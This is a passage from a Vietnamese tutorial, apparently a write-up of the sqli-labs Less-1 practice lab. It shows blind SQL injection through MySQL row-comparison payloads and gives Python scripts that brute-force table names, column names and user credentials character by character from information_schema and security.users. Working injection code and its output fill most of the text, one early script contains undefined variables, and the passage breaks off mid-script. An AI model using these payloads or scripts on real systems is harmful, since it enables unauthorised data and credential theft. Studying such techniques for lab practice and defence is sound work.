information_schema.tables:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">table</span> information_schema.tables <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">21</span>;</span><br><span class="line">Trả về cái bảng, nhìu quá mình ghi vậy cho nhanh :P</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">table</span> information_schema.tables <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">22</span>;</span><br><span class="line">ERROR <span class="number">1054</span> (<span class="number">42</span>S22): <span class="literal">Unknown</span> <span class="keyword">column</span> <span class="string">&#x27;22&#x27;</span> <span class="keyword">in</span> <span class="string">&#x27;order clause&#x27;</span></span><br></pre></td></tr></table></figure><p>Vậy bảng này có 21 cột.</p><p>Payload tiếp theo sẽ có dạng:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/Less-1/?id=1&#x27; and(&#x27;def&#x27;,&#x27;mysql&#x27;,&#x27;a&#x27;,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;=(table information_schema.tables limit  0,1)-- -</span><br></pre></td></tr></table></figure><p>Ở đây, ô đầu tiên là def, ô thứ 2 là database cần tìm table, ô thứ 3 là table. Các ô sau là không quan trọng. Tuy nhiên chúng ta cần phải limit table đúng với từng database. Không có một cách tìm cụ thể, nên việc test khoảng tìm là cần thiết.</p><p>Đây là source cho việc dump table_name của mysql</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url = <span class="string">&#x27;http://localhost/Less-1/?id=&#x27;</span></span><br><span class="line">table_name = <span class="string">&quot;&quot;</span></span><br><span class="line">all_table_name = []</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> index_table <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">        <span class="keyword">if</span> count &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&quot;`abcdefghijklmnopqrstuvwxyz-&#123;|&#125;~&quot;</span>:</span><br><span class="line">            payload = <span class="string">&quot;1&#x27; and (&#x27;def&#x27;,&#x27;sys&#x27;,&#x27;&#123;&#125;&#x27;,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;=(table information_schema.tables limit &#123;&#125;,1)-- -&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">                table_name+j, index_table)</span><br><span class="line">            <span class="built_in">print</span>(table_name+j)</span><br><span class="line">            <span class="comment"># print(url+payload)</span></span><br><span class="line">            payload_encoded = urllib.parse.quote(payload)</span><br><span class="line">            r = requests.get(url=url+payload_encoded)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Your Login name&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="comment"># print(r.text)</span></span><br><span class="line">                <span class="comment"># bước này mình check khi nó bị nhiễu ở kí tự cuối</span></span><br><span class="line">                <span class="keyword">if</span> j == <span class="string">&#x27;~&#x27;</span>:</span><br><span class="line">                    count += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># print(r.text)</span></span><br><span class="line">                table_name += <span class="built_in">chr</span>(<span class="built_in">ord</span>(j)-<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># Thay đổi kí tự cuối về đúng kí tự cần tìm ví dụ nó xuất ra mysqk thì chúng ta cần đổi về mysql bằng cách tăng ascii thằng k lên 1</span></span><br><span class="line">    list_tablename = <span class="built_in">list</span>(table_name)</span><br><span class="line">    list_tablename[-<span class="number">1</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(list_tablename[-<span class="number">1</span>])+<span class="number">1</span>)</span><br><span class="line">    table_name = <span class="string">&quot;&quot;</span>.join(list_dbname)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Table name is: &quot;</span>+table_name)</span><br><span class="line">    <span class="keyword">if</span> db_name == <span class="string">&quot;__________________`&quot;</span>:</span><br><span class="line">    <span class="comment"># dòng này là mình với payload của mình, payload nhiễu sẽ hiện ra cái này --&gt; dấu hiệu nhận biết.</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    all_table_name.append(db_name)</span><br><span class="line">    table_name = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;All table name:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(all_table_name)</span><br></pre></td></tr></table></figure><p>Hmm, ở trên k hay cho lắm cái này thuận lợi cho việc dò tìm hơn:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">url <span class="operator">=</span> <span class="string">&#x27;http://localhost/Less-1/?id=&#x27;</span></span><br><span class="line"># nhập các giá trị</span><br><span class="line">print(&quot;Nhập database cần tìm table_name: &quot;, <span class="keyword">end</span><span class="operator">=</span><span class="string">&#x27;&#x27;</span>)</span><br><span class="line">db_name <span class="operator">=</span> str(input())</span><br><span class="line">print(&quot;Nhập bắt đầu table_name cần tìm: &quot;, <span class="keyword">end</span><span class="operator">=</span><span class="string">&#x27;&#x27;</span>)</span><br><span class="line">index_table_begin <span class="operator">=</span> <span class="type">int</span>(input())<span class="number">-1</span></span><br><span class="line">print(&quot;Nhập kết thúc của table_name cần tìm: &quot;, <span class="keyword">end</span><span class="operator">=</span><span class="string">&#x27;&#x27;</span>)</span><br><span class="line">index_table_end <span class="operator">=</span> <span class="type">int</span>(input())<span class="number">-1</span></span><br><span class="line">table_name <span class="operator">=</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"># <span class="comment">-------</span></span><br><span class="line">all_table_name <span class="operator">=</span> []</span><br><span class="line">count <span class="operator">=</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> index_table <span class="keyword">in</span> <span class="keyword">range</span>(index_table_begin, index_table_end):</span><br><span class="line">    count <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">        if count <span class="operator">&gt;</span> <span class="number">0</span>:</span><br><span class="line">            break</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> &quot;`abcdefghijklmnopqrstuvwxyz-&#123;|&#125;~&quot;:</span><br><span class="line">            payload <span class="operator">=</span> &quot;1&#x27; and (&#x27;def&#x27;,&#x27;&#123;&#125;&#x27;,&#x27;&#123;&#125;&#x27;,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;=(table information_schema.tables limit &#123;&#125;,1)-- -&quot;.format(</span><br><span class="line">                db_name, table_name<span class="operator">+</span>j, index_table)</span><br><span class="line">            print(table_name<span class="operator">+</span>j)</span><br><span class="line">            payload_encoded <span class="operator">=</span> urllib.parse.quote(payload)</span><br><span class="line">            r <span class="operator">=</span> requests.get(url<span class="operator">=</span>url<span class="operator">+</span>payload_encoded)</span><br><span class="line">            if &quot;Your Login name&quot; <span class="keyword">in</span> r.text:</span><br><span class="line">                # bước này mình <span class="keyword">check</span> khi nó bị nhiễu ở kí tự cuối</span><br><span class="line">                if j <span class="operator">=</span><span class="operator">=</span> <span class="string">&#x27;~&#x27;</span>:</span><br><span class="line">                    count <span class="operator">+</span><span class="operator">=</span> <span class="number">1</span></span><br><span class="line">                continue</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                # print(r.text)</span><br><span class="line">                table_name <span class="operator">+</span><span class="operator">=</span> chr(ord(j)<span class="number">-1</span>)</span><br><span class="line">                break</span><br><span class="line">    # Thay đổi kí tự cuối về đúng kí tự cần tìm ví dụ nó xuất ra mysqk thì chúng ta cần đổi về mysql bằng cách tăng ascii thằng k lên <span class="number">1</span></span><br><span class="line">    list_tbname <span class="operator">=</span> list(table_name)</span><br><span class="line">    list_tbname[<span class="number">-1</span>] <span class="operator">=</span> chr(ord(list_tbname[<span class="number">-1</span>])<span class="operator">+</span><span class="number">1</span>)</span><br><span class="line">    table_name <span class="operator">=</span> &quot;&quot;.<span class="keyword">join</span>(list_tbname)</span><br><span class="line">    print(&quot;Table name is: &quot;<span class="operator">+</span>table_name)</span><br><span class="line">    all_table_name.append(table_name)</span><br><span class="line">    table_name <span class="operator">=</span> &quot;&quot;</span><br><span class="line">print(&quot;All table name:&quot;)</span><br><span class="line">print(all_table_name)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Với payload của mình nếu không đúng index so với database thì nó sẽ có table_name là “__________________&#96;” hoặc là string trống. Để tìm đúng thì chúng ta sẽ dò đến khi có tên hợp lý.</p><p>Script dump table_name:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url = <span class="string">&#x27;http://localhost/Less-1/?id=&#x27;</span></span><br><span class="line"><span class="comment"># nhập các giá trị</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nhập database cần tìm table_name: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">db_name = <span class="built_in">str</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nhập bắt đầu table_name cần tìm: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">index_table_begin = <span class="built_in">int</span>(<span class="built_in">input</span>())-<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nhập kết thúc của table_name cần tìm: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">index_table_end = <span class="built_in">int</span>(<span class="built_in">input</span>())-<span class="number">1</span></span><br><span class="line">table_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># -------</span></span><br><span class="line">all_table_name = []</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> index_table <span class="keyword">in</span> <span class="built_in">range</span>(index_table_begin, index_table_end):</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">        <span class="keyword">if</span> count &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&quot;`abcdefghijklmnopqrstuvwxyz-&#123;|&#125;~&quot;</span>:</span><br><span class="line">            payload = <span class="string">&quot;1&#x27; and (&#x27;def&#x27;,&#x27;&#123;&#125;&#x27;,&#x27;&#123;&#125;&#x27;,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;=(table information_schema.tables limit &#123;&#125;,1)-- -&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">                db_name, table_name+j, index_table)</span><br><span class="line">            <span class="built_in">print</span>(table_name+j)</span><br><span class="line">            payload_encoded = urllib.parse.quote(payload)</span><br><span class="line">            r = requests.get(url=url+payload_encoded)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Your Login name&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="comment"># bước này mình check khi nó bị nhiễu ở kí tự cuối</span></span><br><span class="line">                <span class="keyword">if</span> j == <span class="string">&#x27;~&#x27;</span>:</span><br><span class="line">                    count += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># print(r.text)</span></span><br><span class="line">                table_name += <span class="built_in">chr</span>(<span class="built_in">ord</span>(j)-<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># break với trường hợp table_name = &#x27;&#x27; (test là thấy, tùy cách mình lập trình ^^)</span></span><br><span class="line">    <span class="keyword">if</span> table_name == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="comment"># Thay đổi kí tự cuối về đúng kí tự cần tìm ví dụ nó xuất ra mysqk thì chúng ta cần đổi về mysql bằng cách tăng ascii thằng k lên 1</span></span><br><span class="line">    list_tbname = <span class="built_in">list</span>(table_name)</span><br><span class="line">    <span class="built_in">print</span>(list_tbname)</span><br><span class="line">    list_tbname[-<span class="number">1</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(list_tbname[-<span class="number">1</span>])+<span class="number">1</span>)</span><br><span class="line">    table_name = <span class="string">&quot;&quot;</span>.join(list_tbname)</span><br><span class="line">    <span class="comment"># print(&quot;Table name is: &quot;+table_name) print thẳng all table name dễ xử lí vấn đề hơn nhỉ ^^.</span></span><br><span class="line">    all_table_name.append(table_name)</span><br><span class="line">    table_name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;All table name:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(all_table_name)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    //Ở trong bài này, chúng ta cần tìm table_name trong database security</span></span><br><span class="line"><span class="string">    All table name:</span></span><br><span class="line"><span class="string">    [&#x27;emails&#x27;, &#x27;referers&#x27;, &#x27;uagents&#x27;, &#x27;users&#x27;, &#x27;__________________`&#x27;, &#x27;__________________`&#x27;, &#x27;__________________`&#x27;, &#x27;__________________`&#x27;]</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="Dump-column-name"><a href="#Dump-column-name" class="headerlink" title="Dump column_name:"></a>Dump column_name:</h3><p>Bảng này có 22 cột. Tương tự như information_schema.tables bảng này cần thêm 2 giá trị xác định là database và table, và dò khoảng đúng với database và table của column. Việc dò này các bạn lưu ý tự dò nhé, bởi vì với mỗi phiên bản sẽ có thêm những table và column nên nó chỉ gần sát với khoảng của mình thôi.</p><p>Script dump column_name:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url = <span class="string">&#x27;http://localhost/Less-1/?id=&#x27;</span></span><br><span class="line"><span class="comment"># nhập các giá trị</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nhập database cần tìm column_name: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">db_name = <span class="built_in">str</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nhập table cần tìm column_name: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">tb_name = <span class="built_in">str</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nhập bắt đầu column_name cần tìm: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">index_column_begin = <span class="built_in">int</span>(<span class="built_in">input</span>())-<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nhập kết thúc của column_name cần tìm: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">index_column_end = <span class="built_in">int</span>(<span class="built_in">input</span>())-<span class="number">1</span></span><br><span class="line">column_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># -------</span></span><br><span class="line">all_column_name = []</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> index_column <span class="keyword">in</span> <span class="built_in">range</span>(index_column_begin, index_column_end):</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">        <span class="keyword">if</span> count &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&quot;`abcdefghijklmnopqrstuvwxyz-&#123;|&#125;~&quot;</span>:</span><br><span class="line">            payload = <span class="string">&quot;1&#x27; and (&#x27;def&#x27;,&#x27;&#123;&#125;&#x27;,&#x27;&#123;&#125;&#x27;,&#x27;&#123;&#125;&#x27;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;=(table information_schema.columns limit &#123;&#125;,1)-- -&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">                db_name, tb_name, column_name+j, index_column)</span><br><span class="line">            <span class="built_in">print</span>(column_name+j)</span><br><span class="line">            payload_encoded = urllib.parse.quote(payload)</span><br><span class="line">            r = requests.get(url=url+payload_encoded)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Your Login name&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="comment"># bước này mình check khi nó bị nhiễu ở kí tự cuối</span></span><br><span class="line">                <span class="keyword">if</span> j == <span class="string">&#x27;~&#x27;</span>:</span><br><span class="line">                    count += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># print(r.text)</span></span><br><span class="line">                column_name += <span class="built_in">chr</span>(<span class="built_in">ord</span>(j)-<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># break với trường hợp column_name = &#x27;&#x27; (test là thấy, tùy cách mình lập trình ^^)</span></span><br><span class="line">    <span class="keyword">if</span> column_name == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="comment"># Thay đổi kí tự cuối về đúng kí tự cần tìm ví dụ nó xuất ra mysqk thì chúng ta cần đổi về mysql bằng cách tăng ascii thằng k lên 1</span></span><br><span class="line">    list_clname = <span class="built_in">list</span>(column_name)</span><br><span class="line">    <span class="built_in">print</span>(list_clname)</span><br><span class="line">    list_clname[-<span class="number">1</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(list_clname[-<span class="number">1</span>])+<span class="number">1</span>)</span><br><span class="line">    column_name = <span class="string">&quot;&quot;</span>.join(list_clname)</span><br><span class="line">    all_column_name.append(column_name)</span><br><span class="line">    column_name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;All table name:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(all_column_name)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Nhập database cần tìm column_name: security</span></span><br><span class="line"><span class="string">Nhập table cần tìm column_name: users   </span></span><br><span class="line"><span class="string">Nhập bắt đầu column_name cần tìm: 3490</span></span><br><span class="line"><span class="string">Nhập kết thúc của column_name cần tìm: 3505</span></span><br><span class="line"><span class="string">All table name:</span></span><br><span class="line"><span class="string">[&#x27;id&#x27;, &#x27;username&#x27;, &#x27;password&#x27;, &#x27;__________________`&#x27;, &#x27;__________________`&#x27;, &#x27;__________________`&#x27;, &#x27;__________________`&#x27;, &#x27;__________________`&#x27;, &#x27;__________________`&#x27;, &#x27;__________________`&#x27;, &#x27;__________________`&#x27;, &#x27;__________________`&#x27;, &#x27;__________________`&#x27;, &#x27;__________________`&#x27;, &#x27;__________________`&#x27;]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="Dump-bang-da-duoc-xac-dinh"><a href="#Dump-bang-da-duoc-xac-dinh" class="headerlink" title="Dump bảng đã được xác định:"></a>Dump bảng đã được xác định:</h3><p>Mình không hiểu tại sao bây giờ giả sử giá trị cần tìm là dump, thì mình xét với dump thì nó vẫn trả về true. Nhưng mà cũng không quan trọng lắm, làm theo cái mình test thôi à ^^.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> (<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;duma&#x27;</span>,<span class="string">&#x27;&#x27;</span>)<span class="operator">&lt;=</span>(<span class="keyword">table</span> security.users limit <span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> (<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;duma&#x27;</span>,<span class="string">&#x27;&#x27;</span>)<span class="operator">&lt;=</span>(<span class="keyword">table</span> security.users limit <span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                               <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> (<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;dumb&#x27;</span>,<span class="string">&#x27;&#x27;</span>)<span class="operator">&lt;=</span>(<span class="keyword">table</span> security.users limit <span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> (<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;dumb&#x27;</span>,<span class="string">&#x27;&#x27;</span>)<span class="operator">&lt;=</span>(<span class="keyword">table</span> security.users limit <span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                               <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> (<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;dumc&#x27;</span>,<span class="string">&#x27;&#x27;</span>)<span class="operator">&lt;=</span>(<span class="keyword">table</span> security.users limit <span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> (<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;dumc&#x27;</span>,<span class="string">&#x27;&#x27;</span>)<span class="operator">&lt;=</span>(<span class="keyword">table</span> security.users limit <span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                               <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>huhu kĩ năng lập trình kém nên không biết viết như nào cho chuẩn nhất (lười quá), script của mình ở dưới bị dính thằng ‘0’ cách mình bypass chưa tối ưu, nếu giá trị có số 0 thì mình sai nhưng mà lười viết quá.<br>Dump id:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url = <span class="string">&#x27;http://localhost/Less-1/?id=&#x27;</span></span><br><span class="line"><span class="comment"># nhập các giá trị</span></span><br><span 